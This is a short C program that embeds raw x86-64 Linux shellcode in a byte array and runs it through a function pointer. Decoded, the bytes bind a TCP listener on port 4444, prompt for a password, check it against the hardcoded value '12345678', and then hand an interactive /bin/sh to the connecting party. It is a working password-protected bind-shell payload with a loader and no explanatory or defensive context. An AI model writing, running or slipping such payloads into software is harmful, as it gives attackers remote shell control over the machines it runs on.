#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x6a\x31\x58\x54\x5e\xb2\x10\x0f\x05\x6a\x32\x58\x6a\x02\x5e\x0f\x05\x6a\x2b\x58\x48\x83\xec\x10\x54\x5e\x6a\x10\x54\x5a\x0f\x05\x50\x5b\x6a\x03\x58\x0f\x05\x53\x5f\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x48\x89\xe6\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1c\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5a\x57\x54\x5e\x6a\x3b\x58\x0f\x05";


void main()
{
	printf("ShellCode Lenght: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

